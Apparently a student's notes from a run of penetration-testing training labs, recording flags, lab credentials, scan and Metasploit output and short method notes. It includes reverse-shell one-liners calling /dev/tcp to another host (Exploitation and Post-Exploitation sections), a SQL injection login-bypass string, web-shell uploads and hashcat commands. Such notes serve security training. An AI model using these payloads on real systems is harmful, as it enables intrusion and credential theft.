
/.hta                 (Status: 403) [Size: 276]
/.htaccess            (Status: 403) [Size: 276]
/.htpasswd            (Status: 403) [Size: 276]
/index.php            (Status: 200) [Size: 8217]
/javascript           (Status: 301) [Size: 318] [--> http://127.0.0.1:1337/javascript/]
/server-status        (Status: 200) [Size: 7488]
/wp-admin             (Status: 301) [Size: 316] [--> http://127.0.0.1:1337/wp-admin/]
/wp-content           (Status: 301) [Size: 318] [--> http://127.0.0.1:1337/wp-content/]
/wp-includes          (Status: 301) [Size: 319] [--> http://127.0.0.1:1337/wp-includes/]
/xmlrpc.php           (Status: 405) [Size: 42]
Progress: 4614 / 4615 (99.98%)



# CTF 2 Footprinting & Scanning

db_admin:password@123

---

# CTF 3 Enumeration

SMB users:
[+] 192.248.185.3:445 - TARGET [ josh, nancy, bob ] ( LockoutTries=0 PasswordMin=5 )

sf6 auxiliary(scanner/smb/smb_enumshares) > run

[-] 192.248.185.3:139 - Login Failed: Unable to negotiate SMB1 with the remote host: Expecting SMB1 protocol with command=114, got SMB1 protocol with command=114, Status: (0x00000000) STATUS_SUCCESS: The operation completed successfully.
[!] 192.248.185.3:445 - peer_native_os is only available with SMB1 (current version: SMB3)
[!] 192.248.185.3:445 - peer_native_lm is only available with SMB1 (current version: SMB3)
[+] 192.248.185.3:445 - print$ - (DISK) Printer Drivers
[+] 192.248.185.3:445 - IPC$ - (IPC|SPECIAL) IPC Service (target server (Samba, Ubuntu))
[*] 192.248.185.3: - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed

# Credentials


host           origin         service        public  private  realm  private_type  JtR Format  cracked_password
----           ------         -------        ------  -------  -----  ------------  ----------  ----------------
192.248.185.3  192.248.185.3  445/tcp (smb)  josh    purple          Password

---
Found under pubfiles share...

FLAG1{155505f811b84ed3a4332119565b5cf5}


---

FLAG2{836b77c46f454cdd87092f5ac6f83f21}

Psst! I heard there is an FTP service running. Find it and check the banner. 

---

220 Welcome to blah FTP service. Reminder to users, specifically ashley, alice and amanda to change their weak passwords immediately!!!

Found at user: alice with password: pretty. 
After bruteforcing.
FLAG3{a4a88f39b4bc47ee933d439c740c8243}


---

Is this what you're looking for?: FLAG4{21c9f1e346bb4a6ab47c78c0a6629c9b}       

---

# **CTF 4 Vulnerability Scan**


Found in the: http://192.13.28.3/.git/
FLAG1_9891e61dbb61427caba0f1256a7beb6c


Found in the phpmyadmin page that should not be accessable in the mysql database in the secret_info table:
FLAG2_d317d9df5e564614b83935fb97d23767


Found in the http://192.177.163.3/phpinfo.php page
FLAG3_f278714b8c4c44b4b92b9e0e81e0ebd7 



Found these in the /passwords/ directory:  
1,admin,adminpass,g0t r00t?,Admin  
2,adrian,somepassword,Zombie Films Rock!,Admin  
3,john,monkey,I like the smell of confunk,Admin  
4,jeremy,password,d1373 1337 speak,Admin  
5,bryce,password,I Love SANS,Admin  
6,samurai,samurai,Carving fools,Admin  
7,jim,password,Rome is burning,Admin  
8,bobby,password,Hank is my dad,Admin  
9,simba,password,I am a super-cat,Admin  
10,dreveil,password,Preparation H,Admin  
11,scotty,password,Scotty do,Admin  
12,cal,password,C-A-T-S Cats Cats Cats,Admin  
13,john,password,Do the Duggie!,Admin  
14,kevin,42,Doug Adams rocks,Admin  
15,dave,set,Bet on S.E.T. FTW,Admin  
16,patches,tortoise,meow,Admin  
17,rocky,stripes,treats?,Admin  
18,tim,lanmaster53,Because reconnaissance is hard to spell,Admin  
19,ABaker,SoSecret,Muffin tops only,Admin  
20,PPan,NotTelling,Where is Tinker?,Admin  
21,CHook,JollyRoger,Gator-hater,Admin  
22,james,i<3devs,Occupation: Researcher,Admin  
23,ed,pentest,Commandline KungFu anyone?,Admin  

- FLAG4_e44af2eb6966473fbf8acb4714b2e843


Database for accounts & passwords: http://192.19.149.3/phpmyadmin/index.php?db=mutillidae&token=d53f880a18f67e48123ceed799b44fdc#PMAURL:db=mutillidae&table=accounts&target=sql.php&token=d53f880a18f67e48123ceed799b44fdc

admin 3027496BC7D236E3DB1D3F8D86BC460AB6C673FF  ==> password1  
pentester 668425423DB5193AF921380129F465A6425216D0 ==>

---

# **Section 3 CTFs:**

# **CTF 1**

`Found under http://<first_ip_machine>:80/webdav/flag1.txt` After I brute forced the user bob with HYDRA and then uploaded and asp webshel.asp.
a8d13f15e19442eb8959b57935c14e72


![[Pasted image 20250414151754.png]]

Sorry the command is `type C:\flag2.txt`
`70e712ead1de4f5797685dc601076430`


Found in second machine after we brute force SMB creds and found an admionistrator user we used PSEXEC module to get a meterpreter session:
3ef8fac415064f94ab688a472ee1fd73


And the last flag was in the Desktop of Administrator user grabbed in the same meterpreter session....

---

## **CTF 2**

After exploiting SHELLSHOCK Vuln using MSF module:
FLAG1_3e4d73376b2f4009851064c47962bb26  ==> Found under root directroy...



Found under: `/opt/apache/htdocs`
FLAG2_0fb40f6bfc984af8b00b837a0733c348



After exploing the libssh service using a MSF module:
FLAG3_77dc7b83b297464bbf91afd30ba885f9



We find a SUID file that we abuse to gain ROOT access:
FLAG4_000d5c99f5424d23ac83bd6abe388e63



---




# **CTF Network based Attacks:**

http.response.code == 200
FLAG1:
623start.site


Infected user IP: 	10.7.10.47   		195.161.114.3
Infected MAC Address:   80:86:5b:ab:1e:c4       00:b0:64:98:ad:54
Site accessed: http://623start.site/?status=start&av=Windows%20Defender
Site accessed: http://623start.site/?status=install

FALG3:
Filters:
nbns.addr	nbns.name
DESKTOP-9PEA63H
COOLWEATHERCOAT


Found in packet 2485
FLAG4:



WIN-S3WT6LGQFVX



---

#  Host & Network Penetration Testing: The Metasploit Framework CTF 1**



>After using this module: `exploit/windows/mssql/mssql_clr_payload` and specifing the payload to a x64 instead of a x86 payload, we got a shell:

e3a2179b42fa4e1e8de0bdb65a60825a

==============================================================================================
>We go the the config file in C:\Windows\System32\config

but we don't have permissions.. so we try `getsystem` command that tries to impersonate the admin ticket system.
we found the flag2 there:
44b4185c6eba496fa754781f91bbe9f9

==============================================================================================
>Third Flag Found in here:


	C:\Windows\System32>dir C:\Windows\System32\*.txt /s /b
	dir C:\Windows\System32\*.txt /s /b
	
	C:\Windows\System32\catroot2\dberr.txt
	C:\Windows\System32\config\flag2.txt
	C:\Windows\System32\config\systemprofile\AppData\Local\Amazon\Ec2Config\Logs\FrameworkLaunchException.txt
	C:\Windows\System32\drivers\gmreadme.txt
	C:\Windows\System32\drivers\etc\EscaltePrivilageToGetThisFlag.txt
	C:\Windows\System32\en-US\erofflps.txt
	C:\Windows\System32\WindowsPowerShell\v1.0\en-US\default.help.txt
	C:\Windows\System32\WindowsPowerShell\v1.0\Modules\BitsTransfer\en-US\about_BITS_Cmdlets.help.txt
	


Then we:

	Type drivers\etc\EscaltePrivilageToGetThisFlag.txt

987be68407b3466cac0e6991a825f251


==============================================================================================
>Last flag is in the Desktop of Administrator user:

69b7f5da0eb04f5db401a471bfe50448

---


#  Host & Network Penetration Testing: The Metasploit Framework CTF 2**

First flag found in the first Machine_IP using the RSync service banner grabbing.
└─# rsync -av --list-only rsync://192.210.126.3                                                                                                                                                                                           
>backupwscohen   FLAG1_7f0e1f253dd04af58129c4dd7e3723a5



>FLAG2_e84900bd54f0471abbdc13d029ebc08f

![[Pasted image 20250421200404.png | 700]]


For 3rd flag we used this MSF module to gain a meterpreter session to the roxy-wi service:
`exploit/linux/http/roxy_wi_exec`

FLAG3_f95b789f9e5645b9a8554245870b6018


For 4th flag it's found under 

	/etc/cron.d/www-data-cron
cat the file:

	  * * * * * www-data echo "FLAG4_4976dd28252d44218fbc4a20f2d3bf86"


---


# **Host & Network Penetration Testing: Exploitation CTF 1**


	<?php system("bash -c 'bash -i >& /dev/tcp/192.65.7.2P/7777 0>&1'"); ?>

Found after exploiting FlatCore CMS 2.0.7 - Remote Code Execution (RCE) (Authenticated) and gaining a reverse shell.....
FLAG1{00b63ff7342446f4a406aa7eba8c4195}


Found after bruteforcing the user== iamaweakuser:angel 
FLAG2{24d0345e43d640b49f2d48455cea8cfa}


Found after exploiting this module: `auxiliary/scanner/http/wp_duplicator_file_read` and we read the home directory of this account.
FLAG3{64b640c198ae4b4297ead0e5282fa9e7}


read /cat/passwd file and found a user and bruteforced his password===>  iamacrazyfreeuser:123456789
Figured that brute force was not necessary beacause the same user can be logged in without password the flag is there:
FLAG4{f36d2acd8710491f870025c0be2db297}


---

# **#### Host & Network Penetration Testing: Exploitation CTF 2**


Found after bruteforcing tom smb creds: "felipe" and in the HRDocuments share we found this:
733dae965b5740d7a6a7424a256da35d


In the HRDocuments share we found leaked-hashes.txt also so we connect via psexec.py and get the second flag:


We brute forced these hashes via smb_login MSF module and got the flag there and a hint:
19cdf10f2d77425fabb7e00d5f3c7148

Who knows, these creds might come handy! ---> david:omnitrix_9901

d007a8d4cc984ebabdfe92cda44251d8


---


# **#### Host & Network Penetration Testing: Exploitation CTF 3**


After exploiting ProFTP 1.3.5 and changing the `set SITEPATH /var/www/html` the exploit worked....
meterpreter > cat flag1.txt 
FLAG1{dfc91c35e59140ad8deeca1c2a51a16b}
Remember, the magical word is 'letmein'



`meterpreter > netstat -a`

`Connection list`
===============

    Proto  Local address        Remote address       State        User   Inode  PID/Program name
    -----  -------------        --------------       -----        ----   -----  ----------------
    tcp    127.0.0.11:36653     0.0.0.0:*            LISTEN       65534  0
    tcp    0.0.0.0:80           0.0.0.0:*            LISTEN       0      0
    tcp    0.0.0.0:21           0.0.0.0:*            LISTEN       65534  0
    tcp    127.0.0.1:8888       0.0.0.0:*            LISTEN       0      0
    tcp    192.212.176.3:55510  192.212.176.2:4433   ESTABLISHED  33     0
    tcp    192.212.176.3:33304  192.212.176.2:4444   ESTABLISHED  33     0
    tcp    192.212.176.3:80     192.212.176.2:39401  CLOSE_WAIT   33     0
    udp    127.0.0.11:46362     0.0.0.0:*                         65534  0

---

	meterpreter > shell
	Process 119 created.
	Channel 6 created.
	
	/bin/bash -i
	bash: cannot set terminal process group (40): Inappropriate ioctl for device
	bash: no job control in this shell
	www-data@target1:/$ nc 127.0.0.11 36653
	nc 127.0.0.11 36653
	^C
	Terminate channel 6? [y/N]  N
	/bin/bash -i
	www-data@target1:/$ nc 127.0.0.1 8888
	nc 127.0.0.1 8888
	Enter the secret passphrase: letmein
	FLAG2{b31c8fc5a8524b8b99a00292a4256b1e}




We found a share called: site-uploads so we upload a php reverse shell and got the flag there.....

FLAG3{bfaba7e2b5e44348b4c5c44c0b7a7488}



FLAG4{c5a45aa95dc6431eaf5cf4cd38664d6e}




#### Host & Network Penetration Testing: Post-Exploitation CTF 1

Found after exploiting libssh exploit on the first target and in /etc/passwd file:
FLAG1_8d0c5982924b490e8ee59b2ef6634a91

Found in: cat /etc/group
FLAG2_100ea9ef48d542fe95925ee6be1444b4




Found in /etc/cron.d/
FLAG3_9322dfef28f149f69afc10253ecc70ed


Found under /etc/hosts
FLAG4_349ac5d4b7cc4d878d6620cb976b75d6



from the first target we found creds.txt file with user john:Pass@john123 and we log in with SSH to the second machine:

	sh -i >& /dev/tcp/192.79.70.2/7777 0>&1



Solution was so dump the /etc/shadow file was writable 😤🥴

FLAG5_762621fc0f04488e820fdad4fc249d6b


# **Host & Network Penetration Testing: Post-Exploitation CTF 2**
Flag1 found in the home directory of user alice:princess1 after brute forcing its creds
7fdbd6c12b834621b0eb24f47a37e470


Found after finding hashdump.txt file in alice home directory and we brute forced this file using this command:

```
hashat -a3 -m 1000 hashedump.txt /usr/share/wordlists/metasploit/unix_passwords.txt

hashcat -m 1000 --show hashdump.txt
```

c08b4b5a31dc452eb1e00ca3762cc5f7



Found after escalating privs on david's account using Impersonate permission inside /windows/system32/config/flag3.txt
06c79e39545e43198ce0d9c3be6f83ed



Found after changing the "file" folder permissions after it was dening us from reading it we removed that rule and we were able to read it...
dcbd7e2e57ad4f1c81e31372f184f577



# **Web Application Penetration Testing CTF 1**

Found in this path:
`http://192.238.168.3/view_file?file=/flag.txt`

FLAG1_e33a6af1672a4508a33c87cfc50d3290


Found under this directory:
`http://192.238.168.3/secured/flag.txt`

FLAG2_c989a196a68d4f2d95a87af648a138c9


Found after we bruteforce the login page and found these creds: guest:butterfly1

FLAG3_77e13c8e69264c69ab8824cc05bd099f



Found after SQLi on the login page: 

	username=admin'OR'1'='1&password=anything

Or just use this in the username filed:

	admin'OR'1'1


FLAG4_95b960fd05bf48819efb8d61220ee913